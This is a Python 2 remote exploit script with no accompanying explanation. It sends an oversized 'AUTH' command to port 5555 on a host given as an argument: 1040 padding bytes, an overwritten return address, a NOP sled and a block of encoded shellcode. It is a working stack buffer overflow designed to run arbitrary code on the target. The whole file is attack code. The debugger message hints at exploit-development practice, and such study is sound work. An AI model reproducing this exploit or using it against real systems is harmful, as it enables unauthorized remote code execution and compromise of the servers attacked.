#!/usr/bin/python
import time, struct, sys
import socket as so

try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

shellcode = ( 
    "\xd9\xed\xd9\x74\x24\xf4\x5a\x31\xc9\xb1\x52\xbe\x14\x70\x3a"
    "\xe6\x31\x72\x17\x03\x72\x17\x83\xd6\x74\xd8\x13\x2a\x9c\x9e"
    "\xdc\xd2\x5d\xff\x55\x37\x6c\x3f\x01\x3c\xdf\x8f\x41\x10\xec"
    "\x64\x07\x80\x67\x08\x80\xa7\xc0\xa7\xf6\x86\xd1\x94\xcb\x89"
    "\x51\xe7\x1f\x69\x6b\x28\x52\x68\xac\x55\x9f\x38\x65\x11\x32"
    "\xac\x02\x6f\x8f\x47\x58\x61\x97\xb4\x29\x80\xb6\x6b\x21\xdb"
    "\x18\x8a\xe6\x57\x11\x94\xeb\x52\xeb\x2f\xdf\x29\xea\xf9\x11"
    "\xd1\x41\xc4\x9d\x20\x9b\x01\x19\xdb\xee\x7b\x59\x66\xe9\xb8"
    "\x23\xbc\x7c\x5a\x83\x37\x26\x86\x35\x9b\xb1\x4d\x39\x50\xb5"
    "\x09\x5e\x67\x1a\x22\x5a\xec\x9d\xe4\xea\xb6\xb9\x20\xb6\x6d"
    "\xa3\x71\x12\xc3\xdc\x61\xfd\xbc\x78\xea\x10\xa8\xf0\xb1\x7c"
    "\x1d\x39\x49\x7d\x09\x4a\x3a\x4f\x96\xe0\xd4\xe3\x5f\x2f\x23"
    "\x03\x4a\x97\xbb\xfa\x75\xe8\x92\x38\x21\xb8\x8c\xe9\x4a\x53"
    "\x4c\x15\x9f\xf4\x1c\xb9\x70\xb5\xcc\x79\x21\x5d\x06\x76\x1e"
    "\x7d\x29\x5c\x37\x14\xd0\x37\x32\xe2\xda\x7f\x2a\xf6\xda\x7b"
    "\x17\x7f\x3c\xe9\x77\xd6\x97\x86\xee\x73\x63\x36\xee\xa9\x0e"
    "\x78\x64\x5e\xef\x37\x8d\x2b\xe3\xa0\x7d\x66\x59\x66\x81\x5c"
    "\xf5\xe4\x10\x3b\x05\x62\x09\x94\x52\x23\xff\xed\x36\xd9\xa6"
    "\x47\x24\x20\x3e\xaf\xec\xff\x83\x2e\xed\x72\xbf\x14\xfd\x4a"
    "\x40\x11\xa9\x02\x17\xcf\x07\xe5\xc1\xa1\xf1\xbf\xbe\x6b\x95"
    "\x46\x8d\xab\xe3\x46\xd8\x5d\x0b\xf6\xb5\x1b\x34\x37\x52\xac"
    "\x4d\x25\xc2\x53\x84\xed\xe2\xb1\x0c\x18\x8b\x6f\xc5\xa1\xd6"
    "\x8f\x30\xe5\xee\x13\xb0\x96\x14\x0b\xb1\x93\x51\x8b\x2a\xee"
    "\xca\x7e\x4c\x5d\xea\xaa")

nopsled = '\x90'*16
req1 = "AUTH " + "\x41"*1040 + '\x71\x1d\xd1\x65' + nopsled + shellcode

s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
    s.connect((server, port))
    print repr(s.recv(1024))
    s.send(req1)
    print repr(s.recv(1024))
except:
    print "[!] connection refused, check debugger"
    s.close()
